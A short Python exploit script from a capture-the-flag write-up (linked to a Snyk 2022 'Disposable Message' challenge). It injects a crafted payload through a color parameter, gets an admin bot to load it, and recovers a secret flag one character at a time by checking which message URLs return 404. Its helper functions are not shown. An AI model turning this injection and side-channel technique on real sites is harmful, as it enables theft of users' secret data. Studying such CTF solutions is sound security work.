```python
flag = “”
payload = "?color=ffffff}"

messages = {}
for character in alphabet:
    guess = flag + character
    view_url, _ = generate_message()
    messages[guess] = view_url

    payload += generate_payload(view_url, guess)

_, admin_url = generate_message()

url = DOMAIN + admin_url + quote_plus(payload)
requests.post(url)

time.sleep(5)

for guess, url in messages.items():
    status = requests.get(DOMAIN + url).status_code
    print(f"Checking '{guess}': {url} ({status})")

    if status == 404:
        flag = guess
        print("Found match", flag)
        break
```
https://snyk.io/blog/fetch-the-flag-ctf-2022-writeup-disposable-message/
